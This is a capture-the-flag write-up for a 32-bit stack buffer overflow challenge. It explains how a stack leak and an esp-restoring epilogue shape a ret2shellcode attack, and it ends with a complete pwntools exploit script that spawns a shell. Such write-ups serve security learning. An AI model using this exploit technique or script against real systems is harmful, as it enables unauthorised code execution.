There is an obvious buffer overflow in buffer.

The challenge also gives us a leak at a random offset in the stack. At first I did not understand why that was needed and since the stack is executable it seemed like it was just a basic ret2shellcode exploit.

But when debugging I looked closer to the assembly code just before the return :

   0x56556303 <+278>:   pop    ecx
   0x56556304 <+279>:   pop    ebx
   0x56556305 <+280>:   pop    ebp
   0x56556306 <+281>:   lea    esp,[ecx-0x4]
=> 0x56556309 <+284>:   ret

The esp register is set using a value taken from the stack (coming from ecx which is popped from the stack). This means that if we just overwrite the stack with random characters up to the return address, pop ecx will set ecx to a random value and lea esp,[ecx-0x4] will set esp to a wrong value not pointing to our shellcode.

Here the stack leak comes in handy !

Since we know that the leak gives us an address inside the buffer variable that we control, and that the address points in the first 512 bytes of the buffer (randnum % 512;), then we can just fill up the buffer with the leak+512. This will point at least in the second part of the buffer. We can then fill this second part with a nop sled. Finally we just have to put the leaked stack address at the end of our payload just before the shellcode with some other fill up values (for ebx and ebp) to make sure it is popped into ecx. But there is a problem : the values put just before the shellcode to fill registers will be in the way when the execution flow will go through de nop sled :

[Schema]

So we need to add a relative jump to jump over those values and land just after them in the shellcode. For more security I jumped a little further and put a nop sled just before the shellcode to ensure a nice, soft and precise landing !

Note: A little brute force will be needed because this idea will only work if addresses are aligned. But the offset is a random int so it could give unaligned addresses. Since we are on a 32 bits programm addresses are 4 bytes long so we have 1/4 chance that the offset is aligned. Hopefully it’s a small brute force so it should not be a problem.

To recap here’s the plan :

  1. Get leaked stack value (let’s call it leak) and calculate target = leak + 512. This points to second half of the buffer.

  2. Fill up the first half of the buffer with target and the second half with a nop sled (512*b"\x90")

  3. Add a relative jump instruction at the end of the nop sled, just before the shellcode

  4. Add the leaked address and 2 fill up 4 bytes addresses to make sure leak is popped into ecx and ebx and ebp are also popped.

  5. Add shellcode at the end of the paylaod and send it. Enjoy the shell !

Final code :

#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("libc.so.6")
ld = ELF("ld-linux.so.2")

context.binary = exe


def conn():
    if not args.REMOTE:
        r = process([exe.path])
        if args.GDB:
            script = """
            b *main+284
            """
            gdb.attach(r, gdbscript=script)
    else:
        r = remote("spawn.404ctf.fr", 10304)

    return r

def main():
    r = conn()

    r.recvuntil(b"dans son placard ")
    leak = r.recvline().replace(b".", b"").strip().decode()
    leak = int(leak[2:], 16)

    target = leak + 512
    log.info(f"Stack leak : {hex(leak)}")
    log.info(f"Target : {hex(target)}")

    payload = p32(target)*(512//4) 

    # add a jump instruction to jump over next values used for register setting
    jmp = bytes(asm("jmp $+24"))
    #jump 24 bytes ahead (more than 3 addresses to be sure, use a nop sled for security before shellcode)

    payload += b"\x90"*(512+4-len(jmp)) #offset has one more address on the stack before registers so +4

    payload += jmp 

    payload += p32(leak) #ecx
    payload += b"JUNK"*2 #ebx and ebp


    shellcode = shellcraft.sh()
    payload += b"\x90"*24 + bytes(asm(shellcode)) #add a security nop sled

    r.sendlineafter(b"Pouvez vous lui donner ?\n", payload)

    r.interactive()


if __name__ == "__main__":
    main()
